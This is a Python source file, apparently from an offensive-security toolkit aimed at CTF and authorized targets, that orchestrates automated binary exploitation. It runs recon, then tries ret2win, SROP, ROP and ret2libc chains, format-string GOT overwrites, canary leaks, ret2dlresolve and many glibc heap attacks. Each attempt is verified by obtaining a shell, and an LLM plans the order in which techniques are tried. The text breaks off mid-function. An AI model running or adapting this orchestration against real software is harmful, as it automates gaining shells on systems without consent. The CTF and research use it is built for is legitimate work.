"""Autonomous exploitation orchestrator.

Given a binary, it tries a sequence of attack combinations end to end, verifying which
actually work, and feeds everything it learns (mitigations, sinks, gadgets, offsets,
successful chains) back into the knowledge base so future runs improve. For AUTHORIZED
targets / CTF only."""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Callable, List, Optional, Tuple

from ..oracles import build_registry
from .vulnhunt import run_hunt
from .verify import auto_verify
from .autopoc import autopoc, find_win


@dataclass
class AutopwnResult:
    binary: str
    log: List[str] = field(default_factory=list)
    attempts: List[Tuple[str, Optional[bool], str]] = field(default_factory=list)  # (name, ok, detail)
    verified_findings: int = 0
    win_exploit: bool = False
    ai_plan: str = ""
    ai_conclusion: str = ""
    # contexto del binario (defensas/primitivas), para que el informe refleje POR QUE cada tecnica
    arch: str = ""
    bits: str = ""
    mit: dict = field(default_factory=dict)      # nx/pic/canary/relro, tal cual los da checksec
    sinks: List[str] = field(default_factory=list)
    has_win: bool = False


def autopwn(binary: str, config=None, store=None,
            on_step: Optional[Callable[[str], None]] = None, run: bool = True, llm=None,
            techniques: Optional[List[str]] = None) -> AutopwnResult:
    res = AutopwnResult(binary=binary)

    def log(m: str):
        res.log.append(m)
        if on_step:
            on_step(m)

    def learn(fact: str):
        if store:
            store.add_knowledge("autopwn", fact)

    def want(t: str) -> bool:
        return (not techniques) or (t in techniques)

    # PE (Windows): todo lo demas en esta funcion asume ELF (pwntools ELF()/ROP(), checksec de
    # r2 interpretado como NX/PIE/canary de ELF, etc.) -- en vez de intentar colar un formato
    # distinto por cada combo, se desvia aqui a su propio camino (ret2win bajo Wine).
    from .autopoc_pe import autopoc_pe, is_pe
    if is_pe(binary):
        res.arch, res.bits = "x86", "64"
        log("[recon] formato PE detectado -> ret2win bajo Wine (autopoc_pe)")
        if run and want("ret2win"):
            try:
                rp = autopoc_pe(binary, run=run)
                verdict = True if rp.get("verified") else (None if rp.get("ok") else False)
                res.attempts.append(("ret2win-pe", verdict, rp.get("detail") or rp.get("note", "")))
                res.win_exploit = res.win_exploit or bool(rp.get("verified"))
                log(f"[combo] ret2win (PE/Wine) -> {'SHELL VERIFICADA' if rp.get('verified') else 'no verificado'}")
                learn(f"ret2win-pe verified={rp.get('verified')} {rp.get('detail','')}")
            except Exception as e:
                res.attempts.append(("ret2win-pe", False, str(e)))
        return res

    reg = build_registry(binary)

    # 1) recon facts -> feed the KB
    cs = reg.get("r2_checksec").run()
    mit = cs.meta if cs.ok else {}
    arch = mit.get("arch", "?"); bits = mit.get("bits", "?")
    log(f"[recon] arch={arch} {bits}-bit  NX={mit.get('nx')}  PIE={mit.get('pic')}  canary={mit.get('canary')}")
    learn(f"recon {arch}/{bits}: NX={mit.get('nx')} PIE={mit.get('pic')} canary={mit.get('canary')}")

    sinks = reg.get("r2_sinks").run()
    sink_names = sinks.meta.get("sinks", []) if sinks.ok else []
    log(f"[recon] sinks: {', '.join(sink_names) or 'ninguno'}")
    learn(f"sinks: {sink_names}")

    # guarda el contexto estructurado para el informe (no solo en la traza)
    res.arch, res.bits, res.mit, res.sinks = str(arch), str(bits), dict(mit), list(sink_names)
    res.has_win = find_win(binary) is not None

    gad = reg.get("r2_rop").run(filter="pop rdi") if reg.get("r2_rop") else None
    has_pop_rdi = bool(gad and gad.ok and gad.meta.get("count", 0) > 0)
    log(f"[recon] gadget 'pop rdi': {'si' if has_pop_rdi else 'no'}")
    if has_pop_rdi:
        learn("gadget pop rdi disponible")

    # 1b) let the AI decide what to try, based on what it sees (facts above)
    ai_order = None
    if llm is not None and getattr(llm, "available", lambda: False)():
        facts = (f"arch={arch} {bits}-bit; NX={mit.get('nx')}; PIE={mit.get('pic')}; "
                 f"canary={mit.get('canary')}; sinks={sink_names}; pop_rdi={has_pop_rdi}; "
                 f"win_function={'si' if find_win(binary) else 'no'}")
        prior = ""
        if store:
            prior = "\n".join("- " + k["content"] for k in store.get_knowledge(limit=8))
        ai_order, reasoning = _ai_plan(llm, facts, prior)
        res.ai_plan = reasoning
        if reasoning:
            log("[ia] plan: " + reasoning.replace("\n", " ")[:300])
        if store and reasoning:
            learn("plan IA: " + reasoning[:400])

    # 2) hunt + deterministic verification -> feed verified facts
    hunt = run_hunt(reg, binary, llm=None, config=config, store=store)
    findings, _ = auto_verify(reg, hunt.findings, store=store)
    res.verified_findings = sum(1 for f in findings if f.verdict == "verified")
    log(f"[verify] hallazgos verificados por angr: {res.verified_findings}")
    if store:
        store.save_verified_facts(findings, arch, bits, cs.data if cs.ok else "")

    # 3) try combinations
    win = find_win(binary)

    # combo A: ret2win (build + sandbox verify)
    is_pie = str(mit.get("pic", "")).lower() in ("true", "1")
    canary_on = str(mit.get("canary", "")).lower() in ("true", "1")
    # Un canary detiene el overflow lineal ANTES del `ret`, asi que el ret2win directo no puede
    # funcionar: seria un intento de sandbox fallido garantizado. Con canary + win() la ruta
    # correcta es el bypass por fuga (combo G, autocanary), no el ret2win directo.
    if want("ret2win") and win is not None and not canary_on:
        log("[combo] ret2win: construyendo y verificando en sandbox..." + (" (PIE)" if is_pie else ""))
        try:
            if is_pie:
                from .autopie import autopie_ret2win
                rp = autopie_ret2win(binary, run=run)
                verdict = True if rp.get("verified") else (None if rp.get("ok") else False)
                res.attempts.append(("ret2win", verdict, rp.get("detail") or rp.get("note", "")))
                res.win_exploit = res.win_exploit or bool(rp.get("verified"))
                log(f"[combo] ret2win (PIE) -> {'FUNCIONA (verificado)' if rp.get('verified') else 'no verificado'}")
                learn(f"ret2win-pie verified={rp.get('verified')} {rp.get('detail','')}")
            else:
                r = autopoc(binary, run=run)
                res.attempts.append(("ret2win", r.verified, f"offset={r.offset} win={hex(win)}"))
                res.win_exploit = res.win_exploit or r.verified
                log(f"[combo] ret2win -> {'FUNCIONA (verificado)' if r.verified else ('construido, no verificado' if r.ok else 'no aplicable')}")
                learn(f"ret2win verified={r.verified} offset={r.offset} win={hex(win)}")
        except Exception as e:
            res.attempts.append(("ret2win", False, str(e)))
            log(f"[combo] ret2win error: {e}")
    elif want("ret2win") and win is not None and canary_on:
        log("[combo] ret2win: canary activo -> el overflow lineal se omite, se usa el bypass por fuga (combo canary)")
    elif want("ret2win"):
        log("[combo] ret2win: no hay funcion gift -> se omite")

    # combo A2: SROP FIRST on a no-PIE binary with no gift. autosrop is cheap (it bails fast when
    # there is no `pop rax`+syscall+in-binary '/bin/sh') and, when it applies, verifies in one shot
    # -- whereas the generic rop-chain below sweeps execve offsets slowly before falling back to
    # SROP internally. Trying the dedicated fast path first keeps gadget-poor static binaries (srop,
    # staticrop) within the trainer's per-binary budget.
    if run and want("srop") and not is_pie and win is None and not res.win_exploit:
        log("[combo] SROP: sigreturn -> execve('/bin/sh') (sandbox)...")
        try:
            from .autosrop import autosrop
            rs = autosrop(binary)
            verdict = True if rs.get("verified") else (None if rs.get("ok") else False)
            res.attempts.append(("srop", verdict, rs.get("detail") or rs.get("note", "")))
            res.win_exploit = res.win_exploit or bool(rs.get("verified"))
            log(f"[combo] SROP -> {'SHELL VERIFICADA' if rs.get('verified') else 'no verificado'}")
            learn(f"srop verified={rs.get('verified')} {rs.get('detail','')}")
        except Exception as e:
            res.attempts.append(("srop", False, str(e)))

    # combo A2b: SROP on aarch64 -- only even worth trying when recon's own arch says ARM;
    # the driver itself also checks `elf.arch != "aarch64"` and degrades honestly, but gating it
    # here avoids spawning a sandbox run for an x86-64 target that could never apply.
    if run and want("srop-aarch64") and "arm" in (arch or "").lower() and not res.win_exploit:
        log("[combo] SROP (aarch64): sigreturn -> execve('/bin/sh') (sandbox/qemu-aarch64)...")
        try:
            from .autosrop_aarch64 import autosrop_aarch64
            ra = autosrop_aarch64(binary)
            verdict = True if ra.get("verified") else (None if ra.get("ok") else False)
            res.attempts.append(("srop-aarch64", verdict, ra.get("detail") or ra.get("note", "")))
            res.win_exploit = res.win_exploit or bool(ra.get("verified"))
            log(f"[combo] SROP (aarch64) -> {'SHELL VERIFICADA' if ra.get('verified') else 'no verificado'}")
            learn(f"srop-aarch64 verified={ra.get('verified')} {ra.get('detail','')}")
        except Exception as e:
            res.attempts.append(("srop-aarch64", False, str(e)))

    # combo A3: ret2csu -- gadget-poor binaries that still have the two universal
    # __libc_csu_init-style gadgets (sets rdi/rsi/rdx and makes an indirect call WITHOUT any
    # pop rsi/pop rdx of their own). Tried before the generic ROP sweep below, which would never
    # find this path (no pop rsi/pop rdx to find).
    if want("ret2csu") and not res.win_exploit:
        try:
            from .autocsu import autocsu, _csu_applicable
            if _csu_applicable(binary):
                log("[combo] ret2csu: gadgets universales de __libc_csu_init (sandbox)...")
                rcu = autocsu(binary)
                verdict = True if rcu.get("verified") else (None if rcu.get("ok") else False)
                res.attempts.append(("ret2csu", verdict, rcu.get("detail") or rcu.get("note", "")))
                res.win_exploit = res.win_exploit or bool(rcu.get("verified"))
                log(f"[combo] ret2csu -> {'SHELL VERIFICADA' if rcu.get('verified') else 'no verificado'}")
                learn(f"ret2csu verified={rcu.get('verified')} {rcu.get('detail','')}")
        except Exception as e:
            res.attempts.append(("ret2csu", False, str(e)))

    # combo A4: stack pivot -- the overflow is too SHORT for a full chain (only reaches saved
    # rbp/rip), so it migrates RSP into a larger, already-staged buffer via `leave; ret`. Only
    # worth trying when there IS a gift function but the direct/ROP paths above didn't verify
    # (a short overflow is exactly the shape that makes them fail).
    if want("pivot") and not res.win_exploit:
        try:
            from .autopivot import autopivot, _pivot_applicable
            if _pivot_applicable(binary):
                log("[combo] stack pivot: overflow corto -> migracion RSP a buffer .bss (sandbox)...")
                rpv = autopivot(binary)
                verdict = True if rpv.get("verified") else (None if rpv.get("ok") else False)
                res.attempts.append(("pivot", verdict, rpv.get("detail") or rpv.get("note", "")))
                res.win_exploit = res.win_exploit or bool(rpv.get("verified"))
                log(f"[combo] stack pivot -> {'SHELL VERIFICADA' if rpv.get('verified') else 'no verificado'}")
                learn(f"pivot verified={rpv.get('verified')} {rpv.get('detail','')}")
        except Exception as e:
            res.attempts.append(("pivot", False, str(e)))

    # combo A5: callme -- a distinct shape from ret2csu/ret2win: the binary is GADGET-RICH (has a
    # plain `pop rdi; pop rsi; pop rdx; ret`), so there's no csu trick needed, but the gift is
    # split across SEVERAL functions, each validating its OWN fixed arguments, that must be
    # called in the right order. Tried after the single-target strategies above, which never find
    # this (there's no single win()-style target to jump to).
    if want("callme") and not res.win_exploit:
        try:
            from .autocallme import autocallme, _callme_applicable
            if _callme_applicable(binary):
                log("[combo] callme: varias funciones con argumentos validados (sandbox)...")
                rcm = autocallme(binary)
                verdict = True if rcm.get("verified") else (None if rcm.get("ok") else False)
                res.attempts.append(("callme", verdict, rcm.get("detail") or rcm.get("note", "")))
                res.win_exploit = res.win_exploit or bool(rcm.get("verified"))
                log(f"[combo] callme -> {'SHELL VERIFICADA' if rcm.get('verified') else 'no verificado'}")
                learn(f"callme verified={rcm.get('verified')} {rcm.get('detail','')}")
        except Exception as e:
            res.attempts.append(("callme", False, str(e)))

    # combo B: ROP chain (ret2libc / execve). On a PIE binary the base must be resolved first, so
    # use the PIE-aware ROP verifier; otherwise the static/no-PIE ROP builder (with string staging
    # + SROP). Both verify by getting a real shell in the sandbox. Skipped once we already have a
    # verified shell -- no point spending the slow execve-offset sweep after SROP/ret2win won.
    if want("rop-chain") and not res.win_exploit:
      log("[combo] cadena ROP: intentando construir..." + (" (PIE)" if is_pie else ""))
      try:
        if is_pie:
            from .autopie import autopie_rop
            rr = autopie_rop(binary, run=run)
        else:
            from .autopoc import autorop
            rr = autorop(binary, run=run)
        verdict = True if rr.get("verified") else (None if rr.get("ok") else False)
        detail = (rr.get("strategy", "") + (" -> SHELL verificada" if rr.get("verified") else
                  " (construida)" if rr.get("ok") else "")) or rr.get("detail") or rr.get("note", "")
        res.attempts.append(("rop-chain", verdict, detail or rr.get("note", "")))
        res.win_exploit = res.win_exploit or bool(rr.get("verified"))
        log(f"[combo] cadena ROP -> {'SHELL VERIFICADA' if rr.get('verified') else ('construida' if rr.get('ok') else 'no automatica')}")
        learn(f"rop verified={rr.get('verified')} strategy={rr.get('strategy') or rr.get('detail')}")
      except Exception as e:
        res.attempts.append(("rop-chain", False, str(e)))

    # combo B2: ret2libc with leak (dynamic binaries), verified by getting a shell. Skipped once a
    # shell is already verified.
    if want("ret2libc") and not res.win_exploit:
        log("[combo] ret2libc con leak (fuga libc -> system, sandbox)...")
        try:
            from .autolibc import autolibc
            rl = autolibc(binary)
            verdict = True if rl.get("verified") else (None if rl.get("ok") else False)
            res.attempts.append(("ret2libc", verdict, rl.get("detail") or rl.get("note", "")))
            res.win_exploit = res.win_exploit or bool(rl.get("verified"))
            log(f"[combo] ret2libc -> {'SHELL VERIFICADA' if rl.get('verified') else 'no aplicable/verificable'}")
            learn(f"ret2libc verified={rl.get('verified')} {rl.get('detail','')}")
        except Exception as e:
            res.attempts.append(("ret2libc", False, str(e)))

    # combo C: stack shellcode if NX is off
    if want("shellcode-stack") and str(mit.get("nx", "")).lower() in ("false", "0", "nx_off"):
        res.attempts.append(("shellcode-stack", True, "NX desactivado -> shellcode en stack viable"))
        log("[combo] NX off -> shellcode en stack viable")
        learn("shellcode-stack viable (NX off)")

    # combo C2: mprotect()+shellcode (NX bypass sin leak) si NX esta ON -- si esta OFF, el combo
    # C de arriba ya cubre el caso (shellcode en stack directo, sin necesidad de ROP).
    if (want("mprotect-shellcode") and not res.win_exploit
            and str(mit.get("nx", "")).lower() not in ("false", "0", "nx_off")):
        log("[combo] mprotect()+shellcode: ROP a mprotect() sobre un buffer fijo -> shellcode real...")
        try:
            from .autoropmprotect import autoropmprotect
            rm = autoropmprotect(binary)
            verdict = True if rm.get("verified") else (None if rm.get("ok") else False)
            res.attempts.append(("mprotect-shellcode", verdict, rm.get("detail") or rm.get("note", "")))
            res.win_exploit = res.win_exploit or bool(rm.get("verified"))
            log(f"[combo] mprotect()+shellcode -> {'SHELL VERIFICADA' if rm.get('verified') else 'no aplicable/verificable'}")
            learn(f"mprotect-shellcode verified={rm.get('verified')} {rm.get('detail','')}")
        except Exception as e:
            res.attempts.append(("mprotect-shellcode", False, str(e)))

    # combo C3: infoleak chaining (un OOB read/write bug que filtra libc y lo encadena a un
    # hijack de function-pointer -> shell, sin esperar a un bug de formato/heap especifico).
    if want("leak-chain") and not res.win_exploit:
        log("[combo] infoleak chaining: OOB read -> libc_base -> write-what-where -> shell...")
        try:
            from .autoleakchain import autoleakchain
            rk = autoleakchain(binary)
            verdict = True if rk.get("verified") else (None if rk.get("ok") else False)
            res.attempts.append(("leak-chain", verdict, rk.get("detail") or rk.get("note", "")))
            res.win_exploit = res.win_exploit or bool(rk.get("verified"))
            log(f"[combo] infoleak chaining -> {'SHELL VERIFICADA' if rk.get('verified') else 'no aplicable/verificable'}")
            learn(f"leak-chain verified={rk.get('verified')} {rk.get('detail','')}")
        except Exception as e:
            res.attempts.append(("leak-chain", False, str(e)))

    # combo D: format-string (verified by GOT overwrite -> shell)
    if want("format-string") and any(s in sink_names for s in ("printf", "fprintf", "snprintf")):
        log("[combo] format-string: intentando GOT overwrite -> shell (sandbox)...")
        try:
            from .autofmt import autofmt
            rf = autofmt(binary)
            verdict = True if rf.get("verified") else (None if rf.get("ok") else False)
            res.attempts.append(("format-string", verdict, rf.get("detail") or rf.get("note", "")))
            res.win_exploit = res.win_exploit or bool(rf.get("verified"))
            log(f"[combo] format-string -> {'SHELL VERIFICADA' if rf.get('verified') else 'no verificable (requiere printf en bucle)'}")
            learn(f"format-string verified={rf.get('verified')} {rf.get('detail','')}")
        except Exception as e:
            res.attempts.append(("format-string", False, str(e)))

    if ai_order:
        rank = {t: i for i, t in enumerate(ai_order)}
        res.attempts.sort(key=lambda a: rank.get(a[0], 99))
        log("[ia] orden priorizado por la IA: " + ", ".join(ai_order))

    # 4) AI conclusion on what worked
    if llm is not None and getattr(llm, "available", lambda: False)():
        res.ai_conclusion = _ai_conclude(llm, res)
        if res.ai_conclusion:
            log("[ia] conclusion generada")
            learn("conclusion IA: " + res.ai_conclusion[:400])

    # combo E: heap corruption confirmed dynamically
    heap_tool = reg.get("r2_heap")
    has_heap = False
    if heap_tool:
        _hr = heap_tool.run()
        has_heap = _hr.ok and _hr.meta.get("heap", False)
    if want("heap") and has_heap:
        log("[combo] heap: confirmando corrupcion (double-free/overflow) en sandbox...")
        try:
            from .autoheap import autoheap
            rh = autoheap(binary)
            if rh.get("confirmed"):
                kinds = ", ".join(sorted({h["kind"] for h in rh.get("hits", [])}))
                res.attempts.append(("heap-corruption", True, f"confirmada ({kinds})"))
                log(f"[combo] heap -> CORRUPCION CONFIRMADA ({kinds})")
                learn(f"heap-corruption confirmed kinds={kinds}")
            else:
                res.attempts.append(("heap-corruption", None, rh.get("note", "")))
                log("[combo] heap -> no disparada con entradas de prueba")
        except Exception as e:
            res.attempts.append(("heap-corruption", False, str(e)))

    # combo F: heap-to-shell families (menu-driven). Cheap ELF-symbol applicability pre-checks
    # avoid wasted sandbox runs; each driver verifies by getting a REAL shell (not just a crash).
    if run:
        try:
            from .autoheap import autoheap_shell, _heap_shell_applicable
            from .autouaf import autouaf_shell, _uaf_applicable
            from .autotcachedup import autotcachedup_shell, _tcache_dup_applicable
            from .autowow import autowow_shell, _wow_applicable
            from .autohof import autohof, _hof_applicable
            from .autohos import autohos, _hos_applicable
            from .autohoe import autohoe, _hoe_applicable
            from .autobotcake import autobotcake, _botcake_applicable
            from .autolargebin import autolargebin, _largebin_applicable
            from .autohomind import autohomind, _homind_applicable
            from .autoiofile import autoiofile, _iofile_applicable
            from .autofastbindup import autofastbindup, _fastbindup_applicable
            from .autounsafeunlink import autounsafeunlink, _unsafeunlink_applicable
            from .autohoc import autohoc, _hoc_applicable
            from .autostash import autostash, _stash_applicable
            heap_combos = []
            if want("heap-shell") and _heap_shell_applicable(binary):
                heap_combos.append(("heap-shell", autoheap_shell, "tcache poison -> free@GOT=win"))
            if want("uaf-funcptr") and _uaf_applicable(binary):
                heap_combos.append(("uaf-funcptr", autouaf_shell, "UAF reuso de chunk -> funcptr=win"))
            if want("tcache-dup") and _tcache_dup_applicable(binary):
                heap_combos.append(("tcache-dup", autotcachedup_shell, "tcache dup -> GOT=system"))
            if want("write-what-where") and _wow_applicable(binary):
                heap_combos.append(("write-what-where", autowow_shell, "indice sin comprobar -> GOT=win"))
            # glibc-internals families (cada una contra un asignador que reproduce la precondicion
            # concreta que esa tecnica abusa -- house-of-force esta mitigado en glibc >=2.29, el
            # resto no; ver el docstring de cada modulo).
            if want("house-of-force") and _hof_applicable(binary):
                heap_combos.append(("house-of-force", autohof, "top-chunk pre-2.29 -> top arbitrario -> hijack"))
            if want("house-of-spirit") and _hos_applicable(binary):
                heap_combos.append(("house-of-spirit", autohos, "chunk falso en tcache -> hijack"))
            if want("house-of-einherjar") and _hoe_applicable(binary):
                heap_combos.append(("house-of-einherjar", autohoe, "consolidacion hacia atras -> hijack"))
            if want("house-of-botcake") and _botcake_applicable(binary):
                heap_combos.append(("house-of-botcake", autobotcake, "doble-free via unsorted -> tcache poison"))
            if want("largebin-attack") and _largebin_applicable(binary):
                heap_combos.append(("largebin-attack", autolargebin, "insercion en largebin -> escritura de puntero"))
            if want("house-of-mind") and _homind_applicable(binary):
                heap_combos.append(("house-of-mind", autohomind, "ar_ptr forjado -> insercion en fastbin arbitraria"))
            if want("iofile-fsop") and _iofile_applicable(binary):
                heap_combos.append(("iofile-fsop", autoiofile, "vtable de _IO_FILE reapuntada -> __overflow(fp)"))
            if want("fastbin-dup") and _fastbindup_applicable(binary):
                heap_combos.append(("fastbin-dup", autofastbindup, "doble-free A,B,A (pre-safe-linking) -> fd envenenado"))
            if want("unsafe-unlink") and _unsafeunlink_applicable(binary):
                heap_combos.append(("unsafe-unlink", autounsafeunlink, "bypass del chequeo 2.3.4+ -> ptr cerca de si mismo"))
            if want("house-of-corrosion") and _hoc_applicable(binary):
                heap_combos.append(("house-of-corrosion", autohoc, "global_max_fast corrompido -> indice de fastbin sin cota"))
            if want("tcache-stash") and _stash_applicable(binary):
                heap_combos.append(("tcache-stash", autostash, "stash de smallbin->tcache -> chunk falso stashed"))
        except Exception as e:
            heap_combos = []
            log(f"[combo] heap-shell families no disponibles: {e}")
        for name, fn, desc in heap_combos:
            log(f"[combo] {name}: {desc} (sandbox)...")
            try:
                rx = fn(binary)
                verdict = True if rx.get("verified") else (None if rx.get("ok") else False)
                res.attempts.append((name, verdict, rx.get("detail") or rx.get("note", "")))
                res.win_exploit = res.win_exploit or bool(rx.get("verified"))
                log(f"[combo] {name} -> {'SHELL VERIFICADA' if rx.get('verified') else 'no verificado'}")
                learn(f"{name} verified={rx.get('verified')} {rx.get('detail','')}")
            except Exception as e:
                res.attempts.append((name, False, str(e)))

    # combo G: stack-canary bypass by leak (canary present + a gift win()). autocanary leaks the
    # canary via a %s echo, then overflows past it to win().
    if run and want("canary") and canary_on and win is not None:
        log("[combo] canary: fuga del canary + overflow a win (sandbox)...")
        try:
            from .autocanary import autocanary
            rc = autocanary(binary)
            verdict = True if rc.get("verified") else (None if rc.get("ok") else False)
            res.attempts.append(("canary-bypass", verdict, rc.get("detail") or rc.get("note", "")))
            res.win_exploit = res.win_exploit or bool(rc.get("verified"))
            log(f"[combo] canary -> {'SHELL VERIFICADA' if rc.get('verified') else 'no verificado'}")
            learn(f"canary-bypass verified={rc.get('verified')} {rc.get('detail','')}")
        except Exception as e:
            res.attempts.append(("canary-bypass", False, str(e)))

    # combo H: ret2dlresolve -- last resort for a dynamic, no-PIE binary with NO gift and NO leak
    # (no win, no system in it): forge the linker's resolver structures to call system('/bin/sh')
    # without leaking libc. Only worth trying when the simpler routes don't apply, so gate on
    # dynamic + no-PIE + no win(); the driver re-checks RELRO/gadgets and degrades honestly.
    relro_full = "full" in str(mit.get("relro", "")).lower()
    if (run and want("dlresolve") and not is_pie and not relro_full and win is None
            and not res.win_exploit and "system" not in sink_names):
        log("[combo] ret2dlresolve: shell sin leak forjando el resolver dinamico (sandbox)...")
        try:
            from .autodlresolve import autodlresolve
            rd = autodlresolve(binary)
            verdict = True if rd.get("verified") else (None if rd.get("ok") else False)
            res.attempts.append(("ret2dlresolve", verdict, rd.get("detail") or rd.get("note", "")))
            res.win_exploit = res.win_exploit or bool(rd.get("verified"))
            log(f"[combo] ret2dlresolve -> {'SHELL VERIFICADA' if rd.get('verified') else 'no verificado'}")
            learn(f"ret2dlresolve verified={rd.get('verified')} {rd.get('detail','')}")
        except Exception as e:
            res.attempts.append(("ret2dlresolve", False, str(e)))

    log("[fin] combinaciones probadas: " + ", ".join(a[0] for a in res.attempts))
    return res


def _ai_plan(llm, facts: str, prior: str):
    from ..llm.base import Message
    sys = ("Eres un analista de explotacion. Segun los hechos del binario, decide QUE tecnicas "
           "probar y en QUE ORDEN, eligiendo solo de esta lista: ret2win, rop-chain, "
           "shellcode-stack, format-string. Responde en 2-3 frases el razonamiento y termina con "
           "una linea 'ORDEN: t1, t2, ...' con las tecnicas priorizadas. Usa solo la evidencia dada.")
    user = f"Hechos:\n{facts}" + (f"\n\nConocimiento previo:\n{prior}" if prior else "")
    try:
        txt = llm.chat([Message("system", sys), Message("user", user)])
    except Exception:
        return None, ""
    order = None
    for line in txt.splitlines():
        if "ORDEN" in line.upper():
            import re as _re
            toks = _re.findall(r"ret2win|rop-chain|shellcode-stack|format-string", line.lower())
            if toks:
                order = list(dict.fromkeys(toks))
    return order, txt.strip()


def _ai_conclude(llm, res) -> str:
    from ..llm.base import Message
    table = "\n".join(f"- {n}: {('funciona' if ok is True else ('no' if ok is False else 'posible'))} ({d})"
                       for n, ok, d in res.attempts)
    sys = ("Eres un analista de explotacion. Resume en 2-4 frases que combinacion funciono, por que, "
           "y cual seria el siguiente paso concreto. Usa solo los resultados dados, no inventes.")
    user = f"Binario: {res.binary}\nResultados:\n{table}\nExploit ret2win verificado: {res.win_exploit}"
    try:
        return llm.chat([Message("system", sys), Message("user", user)]).strip()
    except Exception:
        return ""


def _flag(v) -> bool:
    return str(v).lower() in ("true", "1")


def _why(mit: dict, has_win: bool, technique: str) -> str:
    """Razon 'defensa -> tecnica': por que ESTA tecnica es la adecuada para este contexto."""
    t = (technique or "").lower()
    pie = _flag(mit.get("pic")); _flag(mit.get("canary"))
    if "canary" in t:
        return "canary ACTIVO + win() + buffer impreso -> fuga del canary, reescritura y overflow a win()"
    if "ret2win" in t:
        return ("win() presente" + (" con PIE -> se resuelve la base en sandbox" if pie
                else " sin canary -> retorno directo a win() (direccion fija)"))
    if "ret2libc" in t:
        return "sin win(): fuga de libc (puts@GOT) -> base -> system('/bin/sh')"
    if "srop-aarch64" in t or ("srop" in t and "aarch64" in t):   # antes del 'srop' generico
        return "binario aarch64 -> SROP: rt_sigreturn (svc #139) restaura un sigframe forjado y ejecuta execve('/bin/sh')"
    if "srop" in t:            # antes de 'rop' (substring): SROP es una tecnica distinta
        return "binario pobre en gadgets con gadget syscall + '/bin/sh' -> SROP: un rt_sigreturn restaura TODOS los registros desde un frame forjado y ejecuta execve('/bin/sh')"
    if "csu" in t:             # antes de 'rop' (substring): ret2csu es distinto del ROP generico
        return "sin pop rsi/pop rdx propios -> los dos gadgets universales de __libc_csu_init fijan rdi/rsi/rdx y hacen una llamada indirecta"
    if "pivot" in t:
        return "overflow demasiado corto para una cadena completa (solo alcanza saved rbp/rip) -> `leave; ret` migra RSP a un buffer .bss ya escalonado con la cadena real"
    if "callme" in t:
        return "gadget `pop rdi; pop rsi; pop rdx; ret` disponible pero el regalo esta repartido en varias funciones -> se llaman todas, cada una con sus propios argumentos, probando el orden correcto"
    if "rop" in t:
        return ("sin win()/system directo -> cadena ROP execve por syscall"
                + (" (PIE: base resuelta en sandbox)" if pie else ""))
    if "format" in t:
        return "printf(entrada) controlado -> escritura via %n (GOT o retorno segun RELRO)"
    if "house-of-force" in t:
        return "asignador con el carve de top-chunk pre-2.29 -> top-chunk corrompido a un tamano enorme desplaza `top` a una direccion elegida"
    if "house-of-spirit" in t:
        return "chunk falso 16-alineado liberado -> entra en el tcache -> una malloc del mismo tamano lo devuelve"
    if "house-of-einherjar" in t:
        return "PREV_INUSE limpio + prev_size forjado -> la consolidacion hacia atras hace que el chunk liberado aterrice en una direccion elegida"
    if "house-of-botcake" in t:
        return "doble-free A,A enrutado por la unsorted bin -> esquiva el chequeo de key del tcache -> chunks solapados"
    if "largebin" in t:
        return "chunk largebin con bk_nextsize corrupto -> la insercion ejecuta `bk_nextsize->fd_nextsize = victim`, una escritura de puntero elegida"
    if "house-of-mind" in t:
        return "ar_ptr del heap_info corrompido -> free() inserta en una arena falsa -> `fastbinsY[idx] = chunk` escribe en una direccion elegida"
    if "iofile" in t or "fsop" in t:
        return "vtable de un _IO_FILE reapuntada -> el flush de stream llama a vtable[__overflow](fp)"
    if "fastbin-dup" in t:
        return "doble-free A,B,A (pre-safe-linking) esquiva el chequeo debil ==fasttop -> fd envenenado hacia un chunk falso"
    if "unsafe-unlink" in t:
        return "fd/bk forjados satisfacen el chequeo >=2.3.4 (FD->bk==P && BK->fd==P) -> unlink() deja un puntero apuntando cerca de si mismo"
    if "house-of-corrosion" in t:
        return "global_max_fast corrompido -> un free() grande se trata como fastbin con indice sin cota -> escritura en una direccion elegida"
    if "tcache-stash" in t:
        return "bk de un chunk de smallbin corrompido a un chunk falso -> el stash loop lo mete en el tcache -> una alloc posterior lo devuelve"
    if "heap" in t or "tcache" in t or "uaf" in t:
        return "primitiva de heap (UAF/tcache) -> secuestro de puntero/GOT a win()/system"
    if "wow" in t or "write" in t:
        return "escritura arbitraria (indice sin check) -> GOT de funcion llamada despues = win()"
    if "dlresolve" in t:
        return "dinamico no-PIE sin win()/system ni leak -> se forjan las estructuras del resolver dinamico para llamar a system('/bin/sh') SIN fuga de libc"
    if "mprotect" in t:
        return "NX activo, gadgets insuficientes para un execve/ret2libc completo -> ROP solo hasta mprotect() sobre un buffer fijo (RWX) y salto a shellcode real"
    if "leak-chain" in t or "leakchain" in t:
        return "sin win()/system directo -> un mismo bug indexable usado como leak (libc_base) y como escritura (hijack de puntero), encadenados en una sola ejecucion"
    return "seleccionada segun las defensas y primitivas observadas"


def render_autopwn(res: AutopwnResult, lang: str = "es") -> str:
    out = [f"## Auto-explotacion de `{res.binary}`\n"]
    if res.win_exploit:
        techs = [n for n, ok, _ in res.attempts if ok is True]
        out.append("> EXPLOIT VERIFICADO: se ejecuto un exploit (" + ", ".join(techs) +
                   ") en sandbox y se consiguio el objetivo.\n")
    # Contexto (defensas/primitivas): refleja POR QUE se eligio cada tecnica, no solo el resultado
    if res.mit or res.arch:
        m = res.mit or {}
        defs = []
        defs.append("NX " + ("ON" if _flag(m.get("nx")) else "off"))
        defs.append("PIE " + ("ON" if _flag(m.get("pic")) else "off"))
        defs.append("canary " + ("ON" if _flag(m.get("canary")) else "off"))
        if m.get("relro"):
            defs.append("RELRO " + str(m.get("relro")))
        out.append("### Contexto del binario (defensas detectadas)\n")
        out.append(f"- arquitectura: **{res.arch or '?'} {res.bits or '?'}-bit**")
        out.append(f"- mitigaciones: **{' · '.join(defs)}**")
        out.append(f"- funcion gift `win()`: **{'si' if res.has_win else 'no'}**")
        out.append(f"- sinks peligrosos: {', '.join(res.sinks) if res.sinks else 'ninguno'}")
        if res.win_exploit:
            techs = [n for n, ok, _ in res.attempts if ok is True]
            out.append("- **por que la tecnica elegida**: " + _why(res.mit, res.has_win, techs[0] if techs else ""))
        out.append("")
    out.append(f"- hallazgos verificados: {res.verified_findings}")
    if res.ai_plan:
        out.append("\n### Plan de la IA (que probar segun lo observado)\n" + res.ai_plan)
    out.append("\n### Combinaciones probadas\n")
    out.append("| tecnica | resultado | detalle |")
    out.append("|---|---|---|")
    for name, ok, detail in res.attempts:
